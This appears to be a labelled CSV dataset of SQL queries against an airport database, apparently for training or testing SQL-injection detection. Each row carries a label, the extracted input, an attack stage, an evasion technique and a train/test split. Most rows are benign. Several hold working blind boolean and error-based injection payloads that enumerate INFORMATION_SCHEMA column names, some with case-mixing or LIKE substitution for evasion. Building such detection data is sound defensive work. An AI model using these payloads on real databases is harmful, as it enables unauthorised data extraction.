"UPDATE airport SET name = ""Ceta Ecotel Heliport"" WHERE 4611 LIKE 4611 AND 8742 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 13,1),25,1))>96) THEN 8742 ELSE (SELECT 7840 UNION SELECT 1197) END))-- -"" WHERE ident = ""PS01""",1," Ceta Ecotel Heliport  WHERE 4611 LIKE 4611 AND 8742 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 13,1),25,1))>96) THEN 8742 ELSE (SELECT 7840 UNION SELECT 1197) END))-- - PS01 ",exploit,equaltolike,success,update,airport-U1,boolean-60,boolean,test
SELECT * FROM airport WHERE icao_code = 'VORY';,0,VORY,,,,select,airport-S1,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 89.0",0,US 89.0,,,,select,airport-S11,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""NL"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,NL 3,,,,select,airport-S19,,,test
"SELECT id FROM airports WHERE municipality = ""Bodø"" AND scheduled_service = ""yes"" AND elevation_feet BETWEEN 108.0 AND 164.0 AND latitude >= 26.5857",0,Bodø yes 108.0 164.0 26.5857,,,,select,airport-S23,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (86387, ""LDM"", ""Inverness"", ""NDB"", 650, ""UA"")",0,86387 LDM Inverness NDB 650 UA,,,,insert,airport-I10,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""FR""",0,FR,,,,select,airport-S9,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""LS03"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Marie Galante"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""KNU"", ""%"");",0,LS03 Marie Galante KNU,,,,select,airport-S17,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""JB3"") OR name LIKE ""Вертодром Козельск, XUBI, ЬУБИ""",0,"JB3 Вертодром Козельск, XUBI, ЬУБИ",,,,select,airport-S10,,,test
"SELECT * FROM airport WHERE gps_code = ""GA49"" OR local_code = ""CL35""",0,GA49 CL35,,,,select,airport-S4,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""GU"" OR c.name LIKE CONCAT(""%"", ""Bulgaria"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,GU Bulgaria 3,,,,select,airport-S20,,,test
"UPDATE countries SET keywords = ""Lufthavnene i Danmark"" WHERE code = ""LS"";",0,Lufthavnene i Danmark LS,,,,update,airport-U8,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""73J, Beaufort County Airport, Frogmore International Airport"") OR name LIKE ""Harbican Airport, 9X9, 9XS9""",0,"73J, Beaufort County Airport, Frogmore International Airport Harbican Airport, 9X9, 9XS9",,,,select,airport-S10,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Аэропорт Богучаны"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""Goneung-ri"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Serristori, Centro di volo Serristori, Aviosuperficie Serristori"", ""%"");",0,"Аэропорт Богучаны Goneung-ri Serristori, Centro di volo Serristori, Aviosuperficie Serristori",,,,select,airport-S17,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Ghazni Province"";",0,Ghazni Province,,,,select,airport-S15,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""BR-0172"", ""small_airport"", ""Iba Airport"", 36.325699, -73.37339782714844, 4419.0)",0,BR-0172 small_airport Iba Airport 36.325699 -73.37339782714844 4419.0,,,,insert,airport-I2,,,test
"UPDATE airport_frequencies SET frequency_mhz = 118.675 WhEre 2250=2250 anD 1871=(SeLeCt (caSE WHen (oRd(Mid((SeLeCt Ifnull(CaSt(COLUmN_nAMe As NcHaR),0x20) From INFORMATION_SCHEMA.cOluMnS WhEre tabLE_NAME=0x616972706f7274 anD table_schema=0x64617461736574 lImiT 7,1),1,1))>96) tHeN 1871 elsE (SeLeCt 2837 uNiON SeLeCt 4662) enD))-- - WHERE type = ""ATIS"";",1," 118.675 WhEre 2250=2250 anD 1871=(SeLeCt (caSE WHen (oRd(Mid((SeLeCt Ifnull(CaSt(COLUmN_nAMe As NcHaR),0x20) From INFORMATION_SCHEMA.cOluMnS WhEre tabLE_NAME=0x616972706f7274 anD table_schema=0x64617461736574 lImiT 7,1),1,1))>96) tHeN 1871 elsE (SeLeCt 2837 uNiON SeLeCt 4662) enD))-- - ATIS ",exploit,randomcase,success,update,airport-U6,boolean-84,boolean,test
"DELETE FROM airport WHERE name LIKE ""Saitama Prefectural Disaster Prevention Air Corps Training Center Heliport"" OR keywords LIKE ""76IN"";  ",0,Saitama Prefectural Disaster Prevention Air Corps Training Center Heliport 76IN,,,,delete,airport-D3,,,test
"UPDATE airport_frequencies SET frequency_mhz = 118.675 wHERe 9900=9900 AnD 8170=(SELEct (CaSE When (OrD(mID((SELEct IfNuLl(cAst(cOlUMN_NaME aS NcHaR),0x20) frOM INFORMATION_SCHEMA.ColUMNS wHERe TabLE_namE=0x616972706f7274 AnD table_schema=0x64617461736574 LImIt 15,1),1,1))>106) thEN 8170 eLsE (SELEct 2780 UNIoN SELEct 5362) enD))-- - WHERE type = ""ATIS"";",1," 118.675 wHERe 9900=9900 AnD 8170=(SELEct (CaSE When (OrD(mID((SELEct IfNuLl(cAst(cOlUMN_NaME aS NcHaR),0x20) frOM INFORMATION_SCHEMA.ColUMNS wHERe TabLE_namE=0x616972706f7274 AnD table_schema=0x64617461736574 LImIt 15,1),1,1))>106) thEN 8170 eLsE (SELEct 2780 UNIoN SELEct 5362) enD))-- - ATIS ",exploit,randomcase,success,update,airport-U6,boolean-84,boolean,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""MY00"", ""small_airport"", ""Lanni Field"", 30.435132, -93.5947036743164, 577.0)",0,MY00 small_airport Lanni Field 30.435132 -93.5947036743164 577.0,,,,insert,airport-I2,,,test
"DELETE FROM navaids WHERE ident = ""FXJ)) ORDER BY 5407#"";",1, FXJ)) ORDER BY 5407# ,recon,commentbeforeparentheses,failure,delete,airport-D6,union-140,union,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""SJKH"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Western Division"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Eire"", ""%"");",0,SJKH Western Division Eire,,,,select,airport-S18,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""NZ"" GROUP BY r.name ORDER BY r.name ASC;",0,NZ,,,,select,airport-S16,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Camaya Coast Airport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Camaya Coast Airport,,,,select,airport-S14,,,test
"SELECT * FROM airport WHERE continent = ""(seLect COnCAT(COnCAT(0x7171627a71,(CAsE wHEn (8050=8050) ThEN 0x31 ELsE 0x30 End)),0x71627a7671))"" AND iso_region LIKE ""US-VA""",1," (seLect COnCAT(COnCAT(0x7171627a71,(CAsE wHEn (8050=8050) ThEN 0x31 ELsE 0x30 End)),0x71627a7671)) US-VA ",recon,randomcase,failure,select,airport-S8,inline-203,inline,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Rakhine State"";",0,Rakhine State,,,,select,airport-S15,,,test
"UPDATE airport SET home_link = ""http://www.greenevilleaviation.com/"" WHERE name = ""Reading Airport""",0,http://www.greenevilleaviation.com/ Reading Airport,,,,update,airport-U4,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BT"" OR c.name LIKE CONCAT(""%"", ""Namibia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,BT Namibia 3,,,,select,airport-S20,,,test
"INSERT INTO countries (code, name, continent) VALUES (""AQ"", ""Mali"", ""OC"")",0,AQ Mali OC,,,,insert,airport-I7,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Flugplatz Lüneburg"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Căuşeni District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Airports in São Tomé and Principe"", ""%"");",0,Flugplatz Lüneburg Airports in Căuşeni District Airports in São Tomé and Principe,,,,select,airport-S18,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (50454, 3565, ""YCVS"", ""ASOS"", ""TWR"", 125.7)",0,50454 3565 YCVS ASOS TWR 125.7,,,,insert,airport-I8,,,test
"DELETE FROM airport_frequencies WHERE type = ""A/D"" AnD EXTRaCtVAluE(1349,CasE whEN (orD(miD((seLEcT iFnULL(caST(cOLuMN_NamE As nchAR),0x20) fRoM INFORMATION_SCHEMA.ColUmnS WheRe TAbLe_nAMe=0x636f756e7472696573 AnD table_schema=0x64617461736574 limiT 4,1),3,1))>112) tHEn 1349 ELsE 0x3A enD) AnD ""hEmQ""=""hEmQ"";",1," A/D"" AnD EXTRaCtVAluE(1349,CasE whEN (orD(miD((seLEcT iFnULL(caST(cOLuMN_NamE As nchAR),0x20) fRoM INFORMATION_SCHEMA.ColUmnS WheRe TAbLe_nAMe=0x636f756e7472696573 AnD table_schema=0x64617461736574 limiT 4,1),3,1))>112) tHEn 1349 ELsE 0x3A enD) AnD ""hEmQ""=""hEmQ ",exploit,randomcase,success,delete,airport-D4,boolean-132,boolean,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""MC"" OR c.name LIKE CONCAT(""%"", ""Heard and McDonald Islands"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,MC Heard and McDonald Islands 5,,,,select,airport-S20,,,train
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Delta Culture Club Airfield""",0,Delta Culture Club Airfield,,,,select,airport-S3,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('YKAP','US-4201','SLIZ','SEUE');",0,YKAP US-4201 SLIZ SEUE,,,,update,airport-U10,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 648.0",0,US 648.0,,,,select,airport-S11,,,train
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Cuddeback Lake Gunnery Range Landing Strip"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Cuddeback Lake Gunnery Range Landing Strip,,,,select,airport-S14,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 25.21 AND  118.8  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  132.5  AND  120.6  ORDER BY frequency;",0,25.21 118.8 132.5 120.6,,,,select,airport-S13,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Kanchow (Kan Hsien), Nanwai, KOW, ZSGZ"") OR name LIKE ""Britten Norman""",0,"Kanchow (Kan Hsien), Nanwai, KOW, ZSGZ Britten Norman",,,,select,airport-S10,,,test
"DELETE FROM regions WHERE name = ""Saramacca"";",0,Saramacca,,,,delete,airport-D8,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""DZ"" OR c.name LIKE CONCAT(""%"", ""Qatar"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 3 ORDER BY navaid_count DESC;",0,DZ Qatar 3,,,,select,airport-S20,,,test
"DELETE FROM navaids WHERE ident = ""PP"";",0,PP,,,,delete,airport-D6,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3937"" AS SIGNED) AND a.iso_country = ""SZ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3937 SZ,,,,select,airport-S22,,,train
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""QA"" OR c.name LIKE CONCAT(""%"", ""Jordan"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",0,QA Jordan 4,,,,select,airport-S20,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Mishima;""",0,Mishima,,,,select,airport-S21,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""1IN6"";",0,1IN6,,,,select,airport-S7,,,train
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""Alfredo Barbieri"") OR name LIKE ""31NY""",0,Alfredo Barbieri 31NY,,,,select,airport-S10,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""KE-6007"";",0,KE-6007,,,,select,airport-S7,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Hubschrauberlandeplatz Polizeipräsidium Frankfurt am Main"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""SEHI"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""55MT"", ""%"");",0,Hubschrauberlandeplatz Polizeipräsidium Frankfurt am Main SEHI 55MT,,,,select,airport-S17,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (8527, ""SJHE"", 12139.0, ""Clay"", 0, 0)",0,8527 SJHE 12139.0 Clay 0 0,,,,insert,airport-I9,,,test
"SELECT * FROM airport WHERE icao_code = 'UKKK' AND 2249 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x636f756e7472696573 AND table_schema LIKE 0x64617461736574 LIMIT 4,1),8,1))>108) THEN 2249 ELSE (SELECT 9229 UNION SELECT 6450) END))-- -';",1," UKKK' AND 2249 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x636f756e7472696573 AND table_schema LIKE 0x64617461736574 LIMIT 4,1),8,1))>108) THEN 2249 ELSE (SELECT 9229 UNION SELECT 6450) END))-- - ",exploit,equaltolike,success,select,airport-S1,boolean-156,boolean,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""US-CO""",0,EU US-CO,,,,select,airport-S8,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Ouro Fino;""",0,Ouro Fino,,,,select,airport-S21,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""US""",0,US,,,,select,airport-S6,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Viâpres-le-Petit Airfield""",0,Viâpres-le-Petit Airfield,,,,select,airport-S3,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PN"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,PN 2,,,,select,airport-S19,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Sichuan Province"";",0,Sichuan Province,,,,select,airport-S15,,,test
SELECT * FROM airport WHERE icao_code = 'YNBR';,0,YNBR,,,,select,airport-S1,,,test
"DELETE FROM airport WHERE name = ""Autobahn Police Heiligenroth Heliport"";  ",0,Autobahn Police Heiligenroth Heliport,,,,delete,airport-D2,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (90991, ""CH"", ""Rottnest Island"", ""NDB"", 326, ""US"")",0,90991 CH Rottnest Island NDB 326 US,,,,insert,airport-I10,,,test
"DELETE FROM countries WHERE code = ""AM"";",0,AM,,,,delete,airport-D7,,,train
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""Assangthang Helipad"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""RAF Sturgate"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""YFR"", ""%"");",0,Assangthang Helipad RAF Sturgate YFR,,,,select,airport-S17,,,test
"SELECT id FROM airports WHERE type LIKE ""heliport"" AND longitude <= -59.8339",0,heliport -59.8339,,,,select,airport-S23,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""LA-VI"", ""67"", ""Afar Region"", ""AS"", ""DZ"")",0,LA-VI 67 Afar Region AS DZ,,,,insert,airport-I5,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5153"" AS SIGNED) AND a.iso_country = ""BT"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5153 BT,,,,select,airport-S22,,,test
SELECT * FROM airport WHERE icao_code = 'KTRK';,0,KTRK,,,,select,airport-S1,,,train
"DELETE FROM regions WHERE name = ""Miklavz na Dravskern polju"";",0,Miklavz na Dravskern polju,,,,delete,airport-D8,,,test
"UPDATE regions SET keywords = ""Airports in Zambezia Province"" where 6169=6169 and 9767=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 19,1),20,1))>96) then 9767 else (select 7243 union select 5606) end))-- -"" WHERE iso_country = ""LV"";",1," Airports in Zambezia Province"" where 6169=6169 and 9767=(select (case when (ord(mid((select ifnull(cast(column_name as nchar),0x20) from INFORMATION_SCHEMA.columns where table_name=0x72756e77617973 and table_schema=0x64617461736574 limit 19,1),20,1))>96) then 9767 else (select 7243 union select 5606) end))-- - LV ",exploit,lowercase,success,update,airport-U9,boolean-102,boolean,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""DZ-02"", ""Liberec Region]-(sELecT 0 whEre 2750=2750 aNd MaKe_SET(6293=3594,3594))|[Liberec Region"", ""EU"", ""BA"", ""https://en.wikipedia.org/wiki/Municipality_of_Rogaška_Slatina"", ""Airports in Ciego de Ávila Province"")",1," DZ-02 Liberec Region]-(sELecT 0 whEre 2750=2750 aNd MaKe_SET(6293=3594,3594))|[Liberec Region EU BA https://en.wikipedia.org/wiki/Municipality_of_Rogaška_Slatina Airports in Ciego de Ávila Province ",recon,randomcase,success,insert,airport-I4,boolean-18,boolean,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (90312, ""AB"", ""Vijayawada"", ""VOR-DME"", 113100, ""CU"")",0,90312 AB Vijayawada VOR-DME 113100 CU,,,,insert,airport-I10,,,test
SELECT * FROM airport WHERE icao_code = 'PAKW';,0,PAKW,,,,select,airport-S1,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Sumsk Air Base""",0,Sumsk Air Base,,,,select,airport-S3,,,test
SHOW GRANTS FOR  'root';,0,,,,,admin,airport-admin11,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Ocampo;""",0,Ocampo,,,,select,airport-S21,,,test
"DELETE FROM airport WHERE name LIKE ""Neos Zigos Aerodrome"" OR keywords LIKE ""56MO"";  ",0,Neos Zigos Aerodrome 56MO,,,,delete,airport-D3,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""8FL9"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Taakaev, តាកែវ"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aeropuertos de Uruguay"", ""%"");",0,"8FL9 Airports in Taakaev, តាកែវ Aeropuertos de Uruguay",,,,select,airport-S18,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GD"" GROUP BY r.name ORDER BY r.name ASC;",0,GD,,,,select,airport-S5,,,test
"SELECT id FROM airports WHERE type = ""small_airport"" AND scheduled_service = ""no"" AND longitude >= -49.24176 AND elevation_feet <= 397.0 AND name LIKE ""%jZByC7E22Lowv6GtjgZX%""",0,small_airport no -49.24176 397.0 jZByC7E22Lowv6GtjgZX,,,,select,airport-S23,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GT"" GROUP BY r.name ORDER BY r.name ASC;",0,GT,,,,select,airport-S5,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""US""",0,US,,,,select,airport-S9,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GH"" GROUP BY r.name ORDER BY r.name ASC;",0,GH,,,,select,airport-S16,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""KR"") OR a.elevation_ft > 672.0",0,KR 672.0,,,,select,airport-S11,,,test
"DELETE FROM airport WHERE name = ""Selles Saint Denis Airfield"";  ",0,Selles Saint Denis Airfield,,,,delete,airport-D2,,,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/La_G%C3%BCera_Airport"" WHERE ident = ""52NY""",0,https://en.wikipedia.org/wiki/La_G%C3%BCera_Airport 52NY,,,,update,airport-U3,,,test
"UPDATE airport SET name = ""Matagorda TARS Site"" WHERE ident = ""IR-0133""",0,Matagorda TARS Site IR-0133,,,,update,airport-U1,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""PT-13"", ""Northern Territory"", ""EU"", ""JM"", ""https://en.wikipedia.org/wiki/Sarawak"", ""Airports in Tambov Oblast"")",0,PT-13 Northern Territory EU JM https://en.wikipedia.org/wiki/Sarawak Airports in Tambov Oblast,,,,insert,airport-I4,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (24898, ""06AR"", 69.0, ""ASPH-P"", 0, 0)",0,24898 06AR 69.0 ASPH-P 0 0,,,,insert,airport-I9,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""NG"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,NG 4,,,,select,airport-S19,,,train
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""GB""",0,GB,,,,select,airport-S9,,,test
"DELETE FROM runways WHERE airport_ident = ""US-0829"";",0,US-0829,,,,delete,airport-D5,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 224.0 AND 2510.0",0,224.0 2510.0,,,,select,airport-S2,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" WheRe 8974=8974 ANd 2373=(SELect (cAsE WhEn (oRD(mID((Ifnull(caSt(DATABaSe() As nCHAR),0x20)),6,1))>104) tHeN 2373 eLSE (SELect 3583 unIon SELect 1262) eND))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" WheRe 8974=8974 ANd 2373=(SELect (cAsE WhEn (oRD(mID((Ifnull(caSt(DATABaSe() As nCHAR),0x20)),6,1))>104) tHeN 2373 eLSE (SELect 3583 unIon SELect 1262) eND))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""NP"" GROUP BY r.name ORDER BY r.name ASC;",0,NP,,,,select,airport-S16,,,test
SELECT * FROM airport WHERE icao_code = 'OPOR';,0,OPOR,,,,select,airport-S1,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 369.0 AND 5646.0",0,369.0 5646.0,,,,select,airport-S2,,,train
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (57333, 38583, ""KWMC"", ""TWR"", ""CTAF"", 121.2)",0,57333 38583 KWMC TWR CTAF 121.2,,,,insert,airport-I8,,,test
"DELETE FROM navaids WHERE ident = ""GZ"";",0,GZ,,,,delete,airport-D6,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""NG"") OR a.elevation_ft > 20.0",0,NG 20.0,,,,select,airport-S11,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PF"" GROUP BY r.name ORDER BY r.name ASC;",0,PF,,,,select,airport-S5,,,test
